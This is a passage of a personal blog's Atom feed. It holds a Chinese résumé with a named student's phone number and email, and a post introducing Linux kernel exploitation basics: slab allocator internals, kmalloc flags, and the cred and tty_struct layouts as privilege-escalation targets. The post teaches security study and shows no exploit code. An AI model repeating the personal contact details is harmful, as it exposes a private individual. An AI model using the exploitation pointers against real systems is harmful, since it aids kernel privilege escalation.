<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>ssj&#39;s blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://github.com/Cracke-S-J/"/>
  <updated>2020-04-09T05:30:35.439Z</updated>
  <id>https://github.com/Cracke-S-J/</id>
  
  <author>
    <name>ssj</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>简历</title>
    <link href="https://github.com/Cracke-S-J/2220/05/29/resume/"/>
    <id>https://github.com/Cracke-S-J/2220/05/29/resume/</id>
    <published>2220-05-29T12:32:02.000Z</published>
    <updated>2020-04-09T05:30:35.439Z</updated>
    
    <content type="html"><![CDATA[<p>2019-09-22版。</p><p>有pdf版，会好看一些。</p><hr><h1 id="孙少洁"><a href="#孙少洁" class="headerlink" title="孙少洁"></a>孙少洁</h1><p>女 | 19 | 本科在读 | 工作经验：2019-1-14 至今</p><p>2018 - 2022 北京科技大学 | 计算机科学与技术 | 博客：cracke-s-j.github.io</p><p>电话：13697842656  |  email：<a href="mailto:cracke_sun@163.com" target="_blank" rel="noopener">cracke_sun@163.com</a></p><h2 id="技术栈"><a href="#技术栈" class="headerlink" title="技术栈"></a>技术栈</h2><ul><li>编译语言<ul><li>熟悉 Java、C++，熟练运用 python，具有编写脚本、开发工具的能力。</li><li>熟悉 ARM、x86/64 等指令集，了解一定编译原理。</li><li>熟悉基本算法与数据结构，熟练运用树上、图上各类算法。</li></ul></li><li>Android 逆向<ul><li>熟悉 Android 逆向基本流程，熟悉静态分析、动态调试。</li><li>熟悉 Android 加壳技术，了解一些通用脱壳机的原理，并能够手动脱 vmp 壳。</li><li>熟悉 JNI 编程，读过 Android 源码，了解 dvm、art 虚拟机运行机制、Android 打包、运行过程。</li></ul></li><li>信息安全<ul><li>熟悉 pwn，熟悉基本二进制漏洞，了解 kernel pwn。</li><li>了解基本 web 安全，熟悉 OWASP，会基本的绕过。</li><li>了解常用加解密算法；会基本的密码学攻击。</li><li>了解智能合约 top 9 漏洞，会基本代码审计。</li></ul></li><li>熟悉渗透测试基本流程，能独立完成 Android、iOS 客户端、接口渗透测试。</li></ul><h2 id="项目-工作经历"><a href="#项目-工作经历" class="headerlink" title="项目/工作经历"></a>项目/工作经历</h2><ul><li>2019-8-5——2020-4-12——鉴释科技——研发工程师<ul><li>独立负责完成编译器预处理部分，用 Hook 技术抓取编译流程进行预处理，兼容 Linux、MacOS、Windows。</li><li>Electron 框架编写客户端，调用客户端核心引擎工作并与服务器端交互。</li><li>为 代码静态分析核心引擎 做测试，分析各个部分算法复杂度。</li><li>学习编译器及代码漏洞分析技术。</li></ul></li><li>2019-1-14——2019-8-4——梆梆安全——安全服务工程师<ul><li>主要方向是 Android 逆向，负责病毒等恶意 App 分析、通用脱壳机研究、技术培训。</li><li>负责 Android / iOS 客户端及 Web 接口渗透测试。</li><li>负责智能合约安全研究，完成“智能合约源码审计标准”，并进行相关技术培训。</li></ul></li><li>2018-9-14——2019-1-13——806 实验室、Ever 404 Club<ul><li>开发 Android 壳子，用到 Dex 加密、动态加载技术。</li><li>逆向分析 Android 市场上多款 App，写过插件，出过应用修改版。</li><li>在保密项目无源程序的情况下，独立将几万行 sparc 汇编翻译为 C 语言。</li><li>参与“基于深度学习的网络爬虫鉴别”项目，主要负责机器学习模型建立与数据统计。</li></ul></li><li>CTF（全国大学生信息安全竞赛）华北赛区二等奖；Noip（全国青少年计算机程序设计竞赛）联赛二等奖；蓝桥杯程序设计竞赛校赛一等奖（第三名）；ACM-ICPC（国际大学生程序设计竞赛）进入校冬训队。</li></ul><h2 id="自我描述"><a href="#自我描述" class="headerlink" title="自我描述"></a>自我描述</h2><ul><li>热爱技术；热爱学习；热爱分享；心态稳，不畏困难。现学现卖的能力很强。</li><li>初中开始接触编程，对计算机尤其是逆向安全有浓厚的兴趣与长久的热情。</li><li>现本科大二在读，课余时间较多，紧急事件随叫随到，接受任何时间加班。</li><li>现在仍在不断学习，简历会随时更新调整。没有研究过怎么写简历。</li></ul><h2 id="兴趣爱好"><a href="#兴趣爱好" class="headerlink" title="兴趣爱好"></a>兴趣爱好</h2><ul><li>写代码</li><li>逆向分析市场上一些 APP</li><li>逛论坛、逛 github、逛博客、分析 CVE</li><li>养猫、云养猫</li><li>中国传统曲艺，京评梆曲</li></ul><hr>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;2019-09-22版。&lt;/p&gt;
&lt;p&gt;有pdf版，会好看一些。&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&quot;孙少洁&quot;&gt;&lt;a href=&quot;#孙少洁&quot; class=&quot;headerlink&quot; title=&quot;孙少洁&quot;&gt;&lt;/a&gt;孙少洁&lt;/h1&gt;&lt;p&gt;女 | 19 | 本科在读 | 工作经验：
      
    
    </summary>
    
    
      <category term="A简历" scheme="https://github.com/Cracke-S-J/categories/A%E7%AE%80%E5%8E%86/"/>
    
    
      <category term="简历" scheme="https://github.com/Cracke-S-J/tags/%E7%AE%80%E5%8E%86/"/>
    
  </entry>
  
  <entry>
    <title>Linux kernel pwn 基础整理</title>
    <link href="https://github.com/Cracke-S-J/2020/04/06/Linuxkernelpwn%E5%9F%BA%E7%A1%80%E6%95%B4%E7%90%86/"/>
    <id>https://github.com/Cracke-S-J/2020/04/06/Linuxkernelpwn%E5%9F%BA%E7%A1%80%E6%95%B4%E7%90%86/</id>
    <published>2020-04-06T06:23:27.000Z</published>
    <updated>2020-04-06T13:44:10.961Z</updated>
    
    <content type="html"><![CDATA[<p>致谢参考：</p><ol><li><a href="https://www.anquanke.com/post/id/201454" target="_blank" rel="noopener">https://www.anquanke.com/post/id/201454</a></li><li><a href="https://paper.seebug.org/1153/" target="_blank" rel="noopener">https://paper.seebug.org/1153/</a></li><li><a href="https://ctf-wiki.github.io/" target="_blank" rel="noopener">https://ctf-wiki.github.io/</a></li></ol><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Linux 内核和一些问题还是跟用户态有很大不同的，而且经常突然就用到了一些奇奇怪怪不知道什么意思的结构体，所以需要简单梳理一下一些基础的知识。</p><h2 id="Linux-内核内存管理"><a href="#Linux-内核内存管理" class="headerlink" title="Linux 内核内存管理"></a>Linux 内核内存管理</h2><h3 id="Buddy-System-伙伴系统"><a href="#Buddy-System-伙伴系统" class="headerlink" title="Buddy System(伙伴系统)"></a>Buddy System(伙伴系统)</h3><p>伙伴系统是一种简单粗暴的内存分配方式，一般是将大块内存简单地拆分，直到到达最小块；最简单地拆分是以2为指数进行拆分，比如定义最小块为 64K，order 为 4，那么最大块为<code>64K * 2 ^ 4 = 1024K</code>。</p><p>Linux内核中较大内存都通过伙伴系统实现，还有jemalloc也使用伙伴系统。</p><p>康一下代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Free memory management - zoned buddy allocator.  */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> CONFIG_FORCE_MAX_ZONEORDER</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_ORDER 11</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_ORDER CONFIG_FORCE_MAX_ZONEORDER</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_ORDER_NR_PAGES (1 &lt;&lt; (MAX_ORDER - 1))</span></span><br></pre></td></tr></table></figure><p>块的大小为一页，通常是4096字节，order为10。</p><h3 id="Slab-分配器"><a href="#Slab-分配器" class="headerlink" title="Slab 分配器"></a>Slab 分配器</h3><p>由于上面分配方法产生很多内存碎片，所以Linux内核引入Slab分配器，目前默认使用的兼容Slab接口的具体分配器是Slub。</p><h3 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h3><p>（开始粘代码）。</p><h4 id="kmem-cache"><a href="#kmem-cache" class="headerlink" title="kmem_cache"></a>kmem_cache</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   * Slab cache management.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache</span> &#123;</span></span><br><span class="line">      <span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_cpu</span> __<span class="title">percpu</span> *<span class="title">cpu_slab</span>;</span></span><br><span class="line">      <span class="comment">/* Used for retriving partial slabs etc */</span></span><br><span class="line">      <span class="keyword">unsigned</span> <span class="keyword">long</span> flags;</span><br><span class="line">      <span class="keyword">unsigned</span> <span class="keyword">long</span> min_partial;</span><br><span class="line">      <span class="keyword">int</span> size;       <span class="comment">/* The size of an object including meta data */</span></span><br><span class="line">      <span class="keyword">int</span> object_size;    <span class="comment">/* The size of an object without meta data */</span></span><br><span class="line">      <span class="keyword">int</span> offset;     <span class="comment">/* Free pointer offset. */</span></span><br><span class="line">  <span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SLUB_CPU_PARTIAL</span></span><br><span class="line">      <span class="keyword">int</span> cpu_partial;    <span class="comment">/* Number of per cpu partial objects to keep around */</span></span><br><span class="line">  <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">      ...</span><br><span class="line">      <span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_node</span> *<span class="title">node</span>[<span class="title">MAX_NUMNODES</span>];</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>cpu_slab是个__percpu对象，就是为每个cpu保存的一个变量，减去加锁开销；node数据中存其它cpu的Slab，<a href="http://lse.sourceforge.net/numa/faq/index.html#what_is_a_node" target="_blank" rel="noopener">what’s node</a>。</p><h4 id="kmem-cache-cpu"><a href="#kmem-cache-cpu" class="headerlink" title="kmem_cache_cpu"></a>kmem_cache_cpu</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_cpu</span> &#123;</span></span><br><span class="line">    <span class="keyword">void</span> **freelist;    <span class="comment">/* Pointer to next available object */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> tid;  <span class="comment">/* Globally unique transaction id */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span>  <span class="comment">/* The slab from which we are allocating */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SLUB_CPU_PARTIAL</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">partial</span>;</span>   <span class="comment">/* Partially allocated frozen slabs */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SLUB_STATS</span></span><br><span class="line">    <span class="keyword">unsigned</span> stat[NR_SLUB_STAT_ITEMS];</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>freelist指向第一个空闲的对象；page指向第一个空闲的对象所在slab的第一页；partial主要包含本地部分分配的slab；其中第一个page的pbojects记录了partial objects数。</p><h4 id="kmem-cache-node"><a href="#kmem-cache-node" class="headerlink" title="kmem_cache_node"></a>kmem_cache_node</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_node</span> &#123;</span></span><br><span class="line">    <span class="keyword">spinlock_t</span> list_lock;</span><br><span class="line">    ...</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SLUB</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> nr_partial;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">partial</span>;</span></span><br><span class="line">    ..</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>partial是Linux内核中可插拔式通用双链表结构，使用内核中双链表的接口进行操作；nr_partial表示partial双链表中的元素个数，即slab的个数。</p><p>partial-&gt;next指向的page结构，用于该结构的page有如下特点：</p><ul><li>frozon = 0</li><li>freelist指向slab中第一个空闲object</li><li>inuse表示对应slab使用中的object个数</li><li><strong>通过lru字段索引链表中的下一个/前一个page</strong></li></ul><p>这里的链表是通过lru索引的。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> &#123;</span></span><br><span class="line">...</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* Third double word block</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">* WARNING: bit 0 of the first word encode PageTail(). That means</span></span><br><span class="line"><span class="comment">* the rest users of the storage space MUST NOT use the bit to</span></span><br><span class="line"><span class="comment">* avoid collision and false-positive PageTail().</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">union</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">lru</span>;</span>   <span class="comment">/* Pageout list, eg. active_list</span></span><br><span class="line"><span class="comment">                * protected by zone_lru_lock !</span></span><br><span class="line"><span class="comment">                * Can be used as a generic list</span></span><br><span class="line"><span class="comment">                * by the page owner.</span></span><br><span class="line"><span class="comment">                */</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure><h3 id="分配和释放"><a href="#分配和释放" class="headerlink" title="分配和释放"></a>分配和释放</h3><h4 id="分配"><a href="#分配" class="headerlink" title="分配"></a>分配</h4><p>超过N页的对象使用伙伴系统分配，其它的流程如下。</p><ol><li>kmem_cache_cpu-&gt;freelist不为空，直接出链返回；</li><li>kmem_cache_cpu-&gt;page-&gt;freelist不为空，则出链，更新cpu_slab-&gt;freelist，然后返回；</li><li>kmem_cache_cpu-&gt;partial不为空，取出第一个slab，更新cpu_slab的freelist和page，取出对象然后返回；</li><li>kmem_cache_node-&gt;partial不为空，取出第一个，类似3更新cpu_slab的freelist和page并返回；</li><li>上面都是空的，则通过伙伴系统分配新的slab，挂到kmem_cache_cpu中，然后goto 1。</li></ol><h4 id="释放"><a href="#释放" class="headerlink" title="释放"></a>释放</h4><p>对象的释放相对复杂（但是个人感觉比libc还差点），和释放之前对象所处的位置以及释放后cache情况有关。假设待释放的object地址为p1，p1对应的page为p2，p1对应的slab为p3，参考上面的几个指针定义，大致有以下路径：</p><ol><li>p3就是当前CPU的kmem_cache_cpu-&gt;freelist所对应的slab，即p1位于当前cpu的kmem_cache_cpu-&gt;freelist所在的page中(p2 == cpu_slab-&gt;page)，此时可以直接释放到freelist上并返回；</li><li>p3位于当前CPU的kmem_cache_cpu-&gt;partial链表中，或者其他CPU的kmem_cache_cpu-&gt;freelist/partial中。此slab处于冻结状态，将p1链入p3-&gt;freelist中；</li><li>p3位于kmem_cache_node-&gt;partial链表中，此时释放分为两种情况：<ol><li>释放p1后，p3的状态为半满。此时正常将p1链入p3的freelist中。</li><li>释放p1后，p3的状态为全空。此时除了将p1链入p3的freelist以外，还需要判断node中slab数是否超过规定值(node-&gt;nr_partial &gt;= min_partial)。如果超过则需要将p3移出node-&gt;partial链表，并将p3释放给伙伴系统。</li></ol></li><li>p3是一个全满的slab，不被任何kmem_cache管理。释放后p3变成一个半满的slab(更新freelist)，同时p3会被加入到当前CPU的kmem_cache_cpu.partial中。加入之前需要判断cpu partial中的空闲对象是否超过了规定值(partial.pobjects &gt; cachep.cpu_partial)，并进行相应的处理：<ol><li>如果没超过，直接链入cpu partial即可；</li><li>如果超过，则将cpu partial中所有slab解冻，将其中所有半满的slab交由node进行管理；将其中所有空的slab回收给伙伴系统；最后再将slab链入到partial中。</li></ol></li></ol><h3 id="kmalloc-相关"><a href="#kmalloc-相关" class="headerlink" title="kmalloc 相关"></a>kmalloc 相关</h3><p>kmalloc函数用于在内核中分配Chunk，它有两个参数，第一个参数是Size，第二个参数称为flag，通过其以几个方式控制kmalloc的行为。</p><p>由于kmalloc函数可以最终通过调用 __get_free_pages 来进行，因此，这些flag通常带有 GFP_ 前缀。</p><p>最通常使用的标志是GFP_KERNEL, 这意味着此次分配是由运行在内核空间的进程进行的。换言之, 这意味着调用函数的是一个进程在尝试执行一个系统调用。</p><p>使用 GFP_KENRL 将意味着kmalloc能够使当前进程在内存不足的情况下执行睡眠操作来等待一页. 一个使用GFP_KERNEL 来分配内存的函数必须是可重入的并且不能在原子上下文中运行. 若当前进程睡眠, 内核将采取正确的动作来定位一些空闲内存, 或者通过刷新缓存到磁盘或者交换出去一个用户进程的内存。</p><p>GFP_KERNEL不一定是正确分配标志; 有时kmalloc从一个进程的上下文的外部进行调用。这类的调用可能发生在中断处理, tasklet, 和内核定时器中. 在这个情况下, 当前进程不应当被置为睡眠, 并且驱动应当使用一个 GFP_ATOMIC标志来代替GFP_KERNEL。此时，内核将正常地试图保持一些空闲页以便来满足原子分配。</p><p>当使用GFP_ATOMIC时，kmalloc甚至能够使用最后一个空闲页。如果最后一个空闲页也不存在将会导致分配失败。</p><p>除此之外，还有如下的标志可供我们选择(更完整的标志列表请查阅linux/gfp.h)：</p><ul><li>GFP_USER – 由用户态的程序来分配内存，可以使用睡眠等待机制。</li><li>GFP_HIGHUSER – 从高地址分配内存。</li><li>GFP_NOIO – 分配内存时禁止使用任何I/O操作。</li><li>GFP_NOFS – 分配内存时禁止调用fs寄存器。</li><li>GFP_NOWAIT – 立即分配，不做等待。</li><li>__GFP_THISNODE – 仅从本地节点分配内存。</li><li>GFP_DMA – 进行适用于DMA的分配，这应该仅应用于kmalloc缓存，否则请使用SLAB_DMA创建的slab。</li></ul><h2 id="内核相关-struct"><a href="#内核相关-struct" class="headerlink" title="内核相关 struct"></a>内核相关 struct</h2><h3 id="cred-struct"><a href="#cred-struct" class="headerlink" title="cred struct"></a>cred struct</h3><p>内核通过这个结构体管理进程，每个进程对应一个 cred，如果能修改uid/gid，就能控制进程权限了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> &#123;</span></span><br><span class="line">    <span class="keyword">atomic_t</span>    usage;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span></span><br><span class="line">    <span class="keyword">atomic_t</span>    subscribers;           <span class="comment">/* number of processes subscribed */</span></span><br><span class="line">    <span class="keyword">void</span>        *put_addr;</span><br><span class="line">    <span class="keyword">unsigned</span>    magic;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CRED_MAGIC  0x43736564</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CRED_MAGIC_DEAD 0x44656144</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">kuid_t</span>      uid;                   <span class="comment">/* real UID of the task */</span></span><br><span class="line">    <span class="keyword">kgid_t</span>      gid;                   <span class="comment">/* real GID of the task */</span></span><br><span class="line">    <span class="keyword">kuid_t</span>      suid;                  <span class="comment">/* saved UID of the task */</span></span><br><span class="line">    <span class="keyword">kgid_t</span>      sgid;                  <span class="comment">/* saved GID of the task */</span></span><br><span class="line">    <span class="keyword">kuid_t</span>      euid;                  <span class="comment">/* effective UID of the task */</span></span><br><span class="line">    <span class="keyword">kgid_t</span>      egid;                  <span class="comment">/* effective GID of the task */</span></span><br><span class="line">    <span class="keyword">kuid_t</span>      fsuid;                 <span class="comment">/* UID for VFS ops */</span></span><br><span class="line">    <span class="keyword">kgid_t</span>      fsgid;                 <span class="comment">/* GID for VFS ops */</span></span><br><span class="line">    <span class="keyword">unsigned</span>    securebits;            <span class="comment">/* SUID-less security management */</span></span><br><span class="line">    <span class="keyword">kernel_cap_t</span>    cap_inheritable;   <span class="comment">/* caps our children can inherit */</span></span><br><span class="line">    <span class="keyword">kernel_cap_t</span>    cap_permitted;     <span class="comment">/* caps we're permitted */</span></span><br><span class="line">    <span class="keyword">kernel_cap_t</span>    cap_effective;     <span class="comment">/* caps we can actually use */</span></span><br><span class="line">    <span class="keyword">kernel_cap_t</span>    cap_bset;          <span class="comment">/* capability bounding set */</span></span><br><span class="line">    <span class="keyword">kernel_cap_t</span>    cap_ambient;       <span class="comment">/* Ambient capability set */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_KEYS</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span>   jit_keyring;       <span class="comment">/* default keyring to attach requested</span></span><br><span class="line"><span class="comment">    /* keys to */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span> __<span class="title">rcu</span> *<span class="title">session_keyring</span>;</span> <span class="comment">/* keyring inherited over fork */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span>  *<span class="title">process_keyring</span>;</span>      <span class="comment">/* keyring private to this process */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span>  *<span class="title">thread_keyring</span>;</span>       <span class="comment">/* keyring private to this thread */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span>  *<span class="title">request_key_auth</span>;</span>     <span class="comment">/* assumed request_key authority */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line">    <span class="keyword">void</span>        *security;             <span class="comment">/* subjective LSM security */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span> *<span class="title">user</span>;</span>          <span class="comment">/* real user ID subscription */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_namespace</span> *<span class="title">user_ns</span>;</span>    <span class="comment">/* user_ns the caps and keyrings are relative to. */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">group_info</span> *<span class="title">group_info</span>;</span>     <span class="comment">/* supplementary groups for euid/fsgid */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span> <span class="title">rcu</span>;</span>               <span class="comment">/* RCU deletion hook */</span></span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure><h3 id="tty-struct"><a href="#tty-struct" class="headerlink" title="tty struct"></a>tty struct</h3><p>讲真我在到处都能看到tty，但是一直不知道它是什么鸟东西。</p><p><a href="https://blog.csdn.net/Charein/article/details/35243009" target="_blank" rel="noopener">对于Linux内核tty设备的一点理解</a></p><p><a href="https://blog.csdn.net/findaway123/article/details/53122031" target="_blank" rel="noopener">Linux下tty/pty/pts/ptmx详解</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span>    magic;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">kref</span> <span class="title">kref</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">device</span> *<span class="title">dev</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_driver</span> *<span class="title">driver</span>;</span></span><br><span class="line">    <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">tty_operations</span> *<span class="title">ops</span>;</span>   <span class="comment">// 重点关注这个</span></span><br><span class="line">    <span class="keyword">int</span> index;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Protects ldisc changes: Lock tty not pty */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ld_semaphore</span> <span class="title">ldisc_sem</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_ldisc</span> *<span class="title">ldisc</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">atomic_write_lock</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">legacy_mutex</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">throttle_mutex</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rw_semaphore</span> <span class="title">termios_rwsem</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">winsize_mutex</span>;</span></span><br><span class="line">    <span class="keyword">spinlock_t</span> ctrl_lock;</span><br><span class="line">    <span class="keyword">spinlock_t</span> flow_lock;</span><br><span class="line">    <span class="comment">/* Termios values are protected by the termios rwsem */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ktermios</span> <span class="title">termios</span>, <span class="title">termios_locked</span>;</span></span><br><span 